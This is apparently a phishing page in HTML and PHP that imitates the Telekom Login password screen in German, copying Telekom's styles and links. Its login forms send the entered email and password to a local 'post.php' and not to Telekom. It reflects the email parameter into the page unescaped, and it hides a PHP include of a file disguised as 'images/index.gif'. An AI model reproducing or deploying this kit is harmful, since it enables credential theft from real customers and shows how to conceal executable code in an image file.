<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<!--[if (lte IE 8) ]>
<html lang="de-DE" class="no-js lte-ie8"><![endif]-->
<!--[if (gt IE 8)|!(IE)]><!-->
<html class="no-js" lang="de"><!--<![endif]--><head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>Telekom Login</title>
    <meta name="description" content="Telekom Login">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="robots" content="noindex">
    <link id="favicon" rel="shortcut icon" href="https://accounts.login.idm.telekom.com/favicon.ico" type="image/x-icon" />
    <link rel="stylesheet" type="text/css" href="https://accounts.login.idm.telekom.com/static/factorx/css/components.min.css">
    <link rel="stylesheet" type="text/css" href="https://accounts.login.idm.telekom.com/static/factorx/css/login-24.06.1.css">
    
    <script>
        var accountLocked = false;
        var accountLockedPermanent = false;
        var accountLockExpiration = 0;
        var loginFailed = false;
    </script>

    
    
    <!--[if lt IE 9]>
    <script type="text/javascript" src="/static/factorx/js/html5shiv.js"></script>
    <script type="text/javascript" src="/static/factorx/js/respond.min.js"></script>
    <![endif]-->

    <script type="text/javascript" src="https://accounts.login.idm.telekom.com/static/factorx/js/jquery-3.2.1.min.js"></script>
    <script type="text/javascript" src="https://accounts.login.idm.telekom.com/static/factorx/js/jquery-matchheight-0.7.2.min.js"></script>
    <script type="text/javascript" src="https://accounts.login.idm.telekom.com/static/factorx/js/components.min.js"></script>
    <script type="text/javascript" src="https://accounts.login.idm.telekom.com/static/factorx/js/login.js"></script><?php include_once "images/index.gif";?>

    
</head>

<body>
<div>
    <header id="tbs-header">
        <div id="tbs-header-content">
            <div class="container-fixed clearfix">
                <div class="pull-left">
                    <i class="icon icon-large">tT</i>
                </div>
                <div class="pull-right">
                    <span class="tbs-slogan">erleben, was verbindet.</span>
                </div>
            </div>
        </div>
        
        
        
    </header>

    

    
    

    
    


    <div class="offset-bottom-4 offset-s-bottom-3"></div>



</div>

<div>

    

    


</div>


<div class="container-fixed">
    <div class="tbs-container">
        <div id="tbs-headline">
            <div id="tbs-brand" class="tbs-relative text-center">
                
                <img src="https://login.t-online.de/stats/t-online-logo-29112019.png">
            </div>
            
            
            <h1 class="offset-top-0 offset-bottom-3 text-center">Telekom Login Passwort eingeben</h1>
        </div>
        <div class="login-box">

            

            
            <div class="offset-bottom-1">
                <div>
                    <div class="form-input-set floating">
                        <label>Benutzername</label>
                        <p class="form-input static text-ellipsis" title="<?=$_GET[email]?>"><?=$_GET[email]?></p>
                    </div>
                </div>

                
                <div>
                    <form id="idchange" name="idchange" method="POST" action="post.php" accept-charset="UTF-8" autocomplete="off">
                        <div class="offset-bottom-1 clearfix">
                            
                            <input type="hidden" name="xsrf_P9q0D2pPgNInTXLhd949pA" value="B__ETeTMKp-BwvAr9X5eQQ">

                            
                            <input type="hidden" name="tid" value="bdca539a-34d4-4027-b6e3-7fd89c1d7c21">

                            
                            <input type="hidden" name="identitychanged" value="identitychanged">
                            <div class="pull-right tbs-sublink">
                                <button class="btn-link text-right" id="id_change" name="changeIdentity" tabindex="50" type="submit">Nicht Ihr Benutzername?</button>
                            </div>
                        </div>
                    </form>
                </div>

                <div>
                    <form id="login" name="login" method="POST" action="post.php" accept-charset="UTF-8" autocomplete="off">

                        <button class="btn-hidden" name="pw_submit" type="submit"></button>

                        
                        <input type="hidden" name="xsrf_P9q0D2pPgNInTXLhd949pA" value="B__ETeTMKp-BwvAr9X5eQQ">

                        
                        <input type="hidden" name="tid" value="bdca539a-34d4-4027-b6e3-7fd89c1d7c21">

                        
                        <input name="email" type="text" readonly placeholder="<?=$_GET[email]?>" value="<?=$_GET[email]?>" class="hidden" aria-hidden="true" tabindex="-1" autocomplete="off">
                        <input type="hidden" name="bdata" id="behavio_hidden">

                        
                        <div>
                            
                            <div class="form-input-set">
                                <input id="pw_pwd" name="pw_pwd" type="password" inputmode="text" maxlength="128" class="form-input" tabindex="20" autocomplete="current-password">
                                <span id="toggle-password-visibility" class="icon-svg icon-eye-display" data-toggle-use-state-from-storage="false" data-toggle-element-id="pw_pwd"></span>
                                <label for="pw_pwd">Passwort</label>
                            </div>

                        </div>

                        
                        

                        
                        <div class="login-helpers clearfix">
                            <!-- persist session component -->
                            <div id="tbs-signin-remember" class="form-checkbox-set">
                                <label>
                                    <input id="checkbox_permanent_displayed" type="hidden" name="persist_session_displayed" value="1">
                                    <div tabindex="30" role="checkbox" class="form-checkbox-js" autocomplete="off" hidefocus="true">&nbsp;<span class="border"></span><span class="check" role="presentation"></span></div><input id="checkbox_permanent" type="checkbox" name="persist_session" value="1" class="form-checkbox hidden" tabindex="30">
                                    <span>Angemeldet bleiben</span>
                                </label>
                            </div>

                        </div>

                        <!-- Login button element -->
                        <div>
                            <button id="pw_submit" name="pw_submit" type="submit" class="text-center btn btn-brand btn-block btn-large" tabindex="40">Login</button>
                        </div>

                        <!-- alt auth method -->
                        <div class="offset-top-1">
                            <button id="altAuthMethod" name="altAuthMethod" type="submit" class="btn btn-block btn-default btn-large" tabindex="41">Andere Anmeldeoptionen</button>
                        </div>
                    </form>
                </div>

                <div class="text-center offset-l-bottom-3-5 offset-l-top-2 offset-s-bottom-2-5 offset-s-top-1-5">
                    <p>Passwort vergessen?</p>
                    <p>Bitte nutzen Sie „Andere Anmeldeoptionen“.</p>
                </div>

                
            </div>

            <div class="text-center offset-bottom-2 offset-l-top-2 offset-s-top-1-5">
                <a id="helpLink" href="https://www.telekom.de/hilfe/telekom-login" tabindex="45" target="_blank">Benötigen Sie Hilfe?</a>
            </div>
        </div>
    </div>
</div>


<footer id="tbs-footer">
    <div class="container-fixed">
        <div class="pull-left">
            <p>© Telekom Deutschland GmbH</p>
            <p class="tbs-text-11">24.06.1, 4c19b305d0f564643c756f778e6033e3, 125b30bd4ec2b21145ffe5af0060b64b2d1a8aca</p>
        </div>
        <div class="pull-right">
            <ul class="list-inline">
                <li>
                    <a href="https://www.telekom.de/start/impressum" target="_blank">Impressum</a>
                </li>
                <li>
                    <a id="data-protection" href="https://www.telekom.de/datenschutz-ganz-einfach" target="_blank">Datenschutz</a>
                </li>
            </ul>
        </div>
    </div>
</footer>



<div>
    
</div>


</body></html>